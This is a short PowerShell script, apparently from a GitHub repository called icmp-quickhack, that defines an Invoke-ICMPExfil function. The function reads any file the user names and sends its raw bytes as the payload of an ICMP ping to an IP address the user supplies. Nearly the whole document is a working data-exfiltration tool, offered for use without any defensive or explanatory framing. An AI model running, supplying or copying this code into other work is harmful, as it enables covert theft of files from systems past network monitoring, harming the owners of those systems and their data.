# ICMP-Exfil from https://github.com/h0ru/icmp-quickhack

function Invoke-ICMPExfil {
    param (
        [string]$i,
        [string]$f
    )

    if (-not $i -or -not $f) {
        Write-Host "[>] Developed by H0ru, check more on https://github.com/h0ru/icmp-quickhacks `nUse: icmp-exfil.ps1 -i <IP Address> -f <File Path> "
        exit
    }

    if (-not (Test-Path $f)) {
        Write-Host "[!] The input file '$f' does not exist."
        exit
    }

    $ping = New-Object System.Net.NetworkInformation.Ping

    $fileBytes = [System.IO.File]::ReadAllBytes($f)

    $ping.Send($i, 1500, $fileBytes)

    Write-Host "[+] Ping completed to $i from file '$f' "
}
